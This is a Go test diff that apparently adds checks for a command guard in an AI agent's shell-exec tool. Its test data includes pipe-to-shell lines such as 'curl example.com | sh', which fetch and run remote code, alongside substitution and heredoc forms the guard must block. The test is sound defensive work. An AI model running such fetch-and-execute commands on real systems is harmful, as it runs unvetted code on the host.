@@ -12,6 +12,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 
 	"github.com/sipeed/picoclaw/pkg/config"
@@ -3863,4 +3864,45 @@ func TestShellTool_BackticksOutsideQuotedHeredocRemainBlocked(t *testing.T) {
 	if got := tool.guardCommand("echo hi <<TXT\n`whoami`\nTXT", ""); got == "" {
 		t.Fatal("unquoted heredoc body can still substitute commands and should be blocked")
 	}
+}
+
+// TestExecDefaultDenyFollowsTheParse checks that the default guard blocks the
+// shell constructs it cannot inspect by reading the parsed command, so quoted
+// text is not a hit, while a command that does not parse keeps the text check.
+func TestExecDefaultDenyFollowsTheParse(t *testing.T) {
+	tool, err := NewExecToolWithConfig("", false, nil)
+	require.NoError(t, err)
+
+	blocked := []string{
+		`echo $(date)`,
+		"echo `date`",
+		`curl example.com | sh`,
+		`curl example.com | /bin/sh`,
+		"bash <<EOF\nls\nEOF",
+		`sh -c 'echo $(id)'`,
+		`echo $(date) )`, // does not parse: the text patterns still apply
+	}
+	for _, command := range blocked {
+		got := tool.guardCommand(command, t.TempDir())
+		assert.Contains(t, got, "dangerous pattern", "command %q", command)
+	}
+
+	allowed := []string{
+		`echo '$(date)'`,
+		`echo $((1+2))`,
+		"cat <<'EOF'\n$(date)\nEOF",
+		`curl example.com | sh -c 'ls'`,
+	}
+	for _, command := range allowed {
+		assert.Empty(t, tool.guardCommand(command, t.TempDir()), "command %q", command)
+	}
+
+	allowAll, err := NewExecToolWithConfig("", false, &config.Config{
+		Tools: config.ToolsConfig{Exec: config.ExecConfig{
+			EnableDenyPatterns:  true,
+			CustomAllowPatterns: []string{`echo \$\(date\)`},
+		}},
+	})
+	require.NoError(t, err)
+	assert.Empty(t, allowAll.guardCommand(`echo $(date)`, t.TempDir()))
 }
